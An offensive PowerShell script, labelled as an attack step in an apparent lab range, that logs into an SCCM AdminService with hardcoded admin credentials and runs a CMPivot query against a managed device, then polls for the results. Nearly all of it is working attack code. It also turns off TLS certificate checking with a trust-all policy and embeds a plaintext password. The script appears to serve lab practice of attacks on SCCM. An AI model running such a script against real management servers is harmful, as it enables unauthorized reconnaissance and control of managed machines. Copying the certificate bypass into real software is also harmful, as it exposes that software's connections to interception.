# WT037: CMPivot on MBR02 via AdminService as MBR02\vagrant (Full Admin) — analyst_t1 (ws01 ATTACK)
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy8 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy8

$mp = 'mbr02.range.local'
$resourceId = 16777219   # MBR02
$query = 'LogicalDisk'
$cred = New-Object System.Management.Automation.PSCredential('MBR02\vagrant', (ConvertTo-SecureString 'vagrant' -AsPlainText -Force))

Write-Output "=== WT037 CMPivot: $query on MBR02 (ResourceID=$resourceId) as MBR02\vagrant ==="

# 0. Device read sanity (was 403 for svc_sccm)
try {
  $r0 = Invoke-WebRequest -Uri "https://$mp/AdminService/v1.0/Device($resourceId)" -Credential $cred -UseBasicParsing -TimeoutSec 25
  Write-Output ("[0] Device read: " + $r0.StatusCode + " :: " + $r0.Content.Substring(0, [Math]::Min(500, $r0.Content.Length)))
} catch {
  $c=0; if ($_.Exception.Response) { $c=[int]$_.Exception.Response.StatusCode }
  Write-Output ("[0] Device read: ERROR " + $c)
}

# 1. Trigger RunCMPivot
$url = "https://$mp/AdminService/v1.0/Device($resourceId)/AdminService.RunCMPivot"
$body = "{`"InputQuery`":`"$query`"}"
Write-Output ("[1] POST " + $url)
try {
  $r = Invoke-WebRequest -Uri $url -Method Post -Body $body -ContentType 'application/json' -Credential $cred -UseBasicParsing -TimeoutSec 30
  Write-Output ("    status=" + $r.StatusCode)
  Write-Output ("    resp=" + $r.Content)
} catch {
  $c=0; if ($_.Exception.Response) { $c=[int]$_.Exception.Response.StatusCode }
  Write-Output ("    ERROR " + $c + " : " + $_.Exception.Message)
  exit 1
}
$opId = $null
if ($r.Content -match '"OperationId"\s*:\s*(\d+)') { $opId = $matches[1] }
if (-not $opId) { Write-Output '[!] No OperationId'; exit 1 }
Write-Output ("[+] OperationId=" + $opId)

# 2. Poll results
$resUrl = "https://$mp/AdminService/v1.0/Device($resourceId)/AdminService.CMPivotResult(OperationId=$opId)"
Write-Output ("[2] Polling " + $resUrl)
$done = $false
for ($i = 1; $i -le 24; $i++) {
  Start-Sleep -Seconds 5
  try {
    $pr = Invoke-WebRequest -Uri $resUrl -Credential $cred -UseBasicParsing -TimeoutSec 15
    if ($pr.StatusCode -eq 200) {
      Write-Output ("[+] Results ready (attempt " + $i + ")")
      Write-Output $pr.Content
      $done = $true
      break
    }
  } catch {
    $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
    Write-Output ("    attempt " + $i + ": HTTP " + $code)
    if ($code -eq 404 -or $code -eq 0) { continue }
  }
}
if (-not $done) { Write-Output '[!] Timed out' }
Write-Output 'WT037_DONE'
